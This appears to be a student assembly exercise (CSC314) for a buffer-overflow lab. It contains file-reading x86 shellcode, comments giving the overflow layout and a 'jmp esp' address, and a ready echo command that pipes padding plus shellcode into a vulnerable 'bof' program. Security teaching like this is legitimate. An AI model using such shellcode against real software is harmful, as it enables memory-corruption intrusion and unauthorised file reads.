%include "/usr/local/share/csc314/asm_io.inc"


segment .data


segment .bss


segment .text
	global  asm_main

asm_main:
	push	ebp
	mov		ebp, esp
	; ********** CODE STARTS HERE **********
; https://defuse.ca/online-x86-assembler.htm

; [16 bytes buffer] [4 bytes ebp] [4 bytes return] [... bytes shellcode]

; jmp esp @ 0x08048526 (\x26\x85\x04\x08)

; filename @ 0x08049b12

; echo -en "AAAAAAAAAAAAAAAABBBB\x6A\x05\x58\x68\x12\x9B\x04\x08\x5B\x31\xC9\x99\xCD\x80\x6A\xF2\x5B\x6A\x03\x58\x68\x12\x9B\x04\x08\x59\x6A\x1E\x5A\xCD\x80\x6A\x1E\x5A\x6A\x04\x58\x31\xDB\x43\x68\x12\x9B\x04\x08\x59\xCD\x80\x31\xC0\x40\x31\xDB\xCD\x80" | bof

; Currently this shellcode is 75 bytes, and contains NULLs (0x00).

; sys_open file
push 5
pop eax
push 0x08049b12
pop ebx
xor ecx, ecx
cdq
int 0x80

; sys_read from file into memory
;push 0xFFFFFFF2
;pop ebx
xor ebx, ebx
mov ebx, eax
push 3
pop eax
push 0x08049b12
pop ecx
push 30
pop edx
int 0x80

; sys_write memory to terminal
push 30
pop edx
push 4
pop eax
xor ebx, ebx
inc ebx
push 0x08049b12
pop ecx
int 0x80

; sys_exit
xor eax, eax
inc eax
xor ebx, ebx
int 0x80

	; *********** CODE ENDS HERE ***********
	mov		eax, 0
	mov		esp, ebp
	pop		ebp
	ret
